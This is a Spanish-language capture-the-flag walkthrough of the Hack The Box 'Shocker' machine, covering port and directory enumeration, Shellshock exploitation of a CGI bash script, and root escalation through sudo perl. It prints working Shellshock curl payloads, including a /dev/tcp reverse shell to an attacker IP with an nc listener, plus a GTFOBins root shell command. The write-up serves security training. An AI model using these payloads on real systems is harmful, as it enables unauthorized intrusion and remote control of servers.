[🐛 Shocker — HTB [Linux · Easy] 36c15bd2d16c81ebad57db01d7527f83.md](https://github.com/user-attachments/files/28343958/Shocker.HTB.Linux.Easy.36c15bd2d16c81ebad57db01d7527f83.md)
# 🐛 Shocker — HTB [Linux · Easy]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.3.146` / `10.129.4.52` |
| OS | Linux (Ubuntu) |
| Vector inicial | Apache cgi-bin → Shellshock (CVE-2014-6271) → RCE |
| Usuario inicial | `shelly` (reverse shell vía curl User-Agent) |
| Escalada | `sudo perl` NOPASSWD → GTFOBins |
| Root | `root` vía `sudo perl -e 'exec "/bin/sh"'` |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Dos puertos: HTTP y SSH en puerto no estándar 2222. TTL 63 — Linux.

```bash
sudo nmap -sS --min-rate 5000 -p- -Pn -n 10.129.3.146 -oG allPorts
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image.png)
> 

## Nmap — versiones

Apache 2.4.18 Ubuntu, OpenSSH 7.2p2. http-title: Site doesn't have a title. OS: Linux.

```bash
nmap -sVC -p80,2222 10.129.3.146
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image1.png)
> 

---

# 2. Enumeración web

La web muestra una imagen de un bug con el texto "Don't Bug Me!" — sin contenido útil en el código fuente ni en los metadatos de la imagen.

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image2.png)
> 

Buscamos directorios con gobuster:

```bash
gobuster dir -u http://10.129.3.146 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image3.png)
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image4.png)
> 

`cgi-bin/` existe pero devuelve 403 — el directorio existe pero no tenemos acceso directo. Los CGI scripts dentro pueden ser accesibles individualmente. Forzamos búsqueda de scripts con extensiones:

```bash
gobuster dir -u http://10.129.4.52/cgi-bin \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x cgi,sh,pl
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image5.png)
> 

Script encontrado: `/cgi-bin/user.sh`. Accesible y devuelve contenido (200). Al acceder devuelve `uptime` — es un script bash que ejecuta comandos del sistema.

---

# 3. Explotación — Shellshock (CVE-2014-6271)

Un CGI script en bash es potencialmente vulnerable a Shellshock. La vulnerabilidad permite inyectar comandos en las cabeceras HTTP que Apache pasa al script bash como variables de entorno. La cabecera `User-Agent` es la más usada.

Verificamos ejecución de comandos:

```bash
curl -A "() { :; }; echo; echo '---'; /usr/bin/id" \
  http://10.129.4.52/cgi-bin/user.sh
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image6.png)
> 

Shellshock confirmado. Lanzamos reverse shell:

```bash
curl -A "() { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.105/4444 0>&1" \
  http://10.129.4.52/cgi-bin/user.sh
```

```bash
# Listener:
nc -lvnp 4444
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image7.png)
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image8.png)
> 

---

# 4. Escalada — sudo perl GTFOBins

`shelly` puede ejecutar `perl` como root sin contraseña. GTFOBins tiene el payload directo:

```bash
sudo perl -e 'exec "/bin/sh"'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image9.png)
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Shocker/assets/image10.png)
> 

---

# 5. Cadena de ataque

```
nmap → puerto 80 Apache + cgi-bin
    ↓
gobuster /cgi-bin -x sh → user.sh (200)
    ↓
curl Shellshock User-Agent payload → RCE como shelly
    ↓
reverse shell → shelly@Shocker
    ↓
sudo -l → (root) NOPASSWD: /usr/bin/perl
    ↓
sudo perl -e 'exec "/bin/sh"' → root
    ↓
user.txt + root.txt
```

---

# 6. Moralejas

## cgi-bin 403 no significa que esté vacío — siempre fuzzear con extensiones

El directorio `/cgi-bin/` devuelve 403 en el listado pero los scripts dentro son accesibles individualmente. Gobuster con `-x cgi,sh,pl` busca archivos con esas extensiones directamente. Un script bash en cgi-bin es siempre candidato a Shellshock si el servidor es Apache antiguo.

## Shellshock sigue siendo relevante en máquinas legacy

CVE-2014-6271 afecta a versiones de bash anteriores a 4.3. El vector es cualquier cabecera HTTP que Apache pase al script CGI como variable de entorno. El payload `() { :; }; comando` en User-Agent, Referer o Cookie es suficiente. Verificar con `id` antes de lanzar la reverse shell.

## sudo -l es el primer comando tras foothold en Linux

Siempre. `sudo -l` muestra qué binarios puede ejecutar el usuario con sudo. Si hay algo en GTFOBins con NOPASSWD, es escalada directa. Perl, python, ruby, vim, less, find, awk — todos tienen entradas en GTFOBins.

## El patrón OSCP de esta máquina

```
CGI script en Apache → Shellshock RCE
    ↓
sudo NOPASSWD binario GTFOBins → root
```

Cadena mínima, dos pasos. La máquina se llama Shocker por la vulnerabilidad Shellshock — si ves cgi-bin en un Apache antiguo, es el reflejo automático.

---

# 7. Conceptos técnicos clave

**Shellshock (CVE-2014-6271):** Vulnerabilidad en bash que permite ejecutar comandos arbitrarios definiendo funciones en variables de entorno con código extra después de la definición. Cuando Apache CGI pasa las cabeceras HTTP como variables de entorno al script bash, el bash vulnerable ejecuta el código inyectado. El payload es: `() { :; }; <comando>`.

**CGI (Common Gateway Interface):** Mecanismo que permite a un servidor web ejecutar scripts externos y devolver su output como respuesta HTTP. Apache pasa las cabeceras de la petición como variables de entorno al script. Si el script está en bash y la versión es vulnerable, cada cabecera es un vector de Shellshock.

**GTFOBins:** Base de datos de binarios Unix que pueden usarse para escalar privilegios, escapar de entornos restringidos, o ejecutar comandos arbitrarios cuando se tienen permisos especiales. `sudo perl -e 'exec "/bin/sh"'` ejecuta una shell con los privilegios de sudo (root si está configurado así).

---

# 8. Comandos clave

```bash
# Reconocimiento
nmap -sS -p- --min-rate 5000 10.129.3.146
nmap -sVC -p80,2222 10.129.3.146

# Enumeración web
gobuster dir -u http://10.129.3.146 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -f

gobuster dir -u http://10.129.3.146/cgi-bin \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x cgi,sh,pl

# Verificar Shellshock
curl -A "() { :; }; echo; echo '---'; /usr/bin/id" \
  http://10.129.3.146/cgi-bin/user.sh

# Reverse shell vía Shellshock
curl -A "() { :; }; echo; /bin/bash -i >& /dev/tcp/<TU_IP>/4444 0>&1" \
  http://10.129.3.146/cgi-bin/user.sh

# Listener
nc -lvnp 4444

# Post-explotación
sudo -l  # buscar NOPASSWD

# Escalada con perl (GTFOBins)
sudo perl -e 'exec "/bin/sh"'

# Flags
cat /home/shelly/user.txt
cat /root/root.txt
```
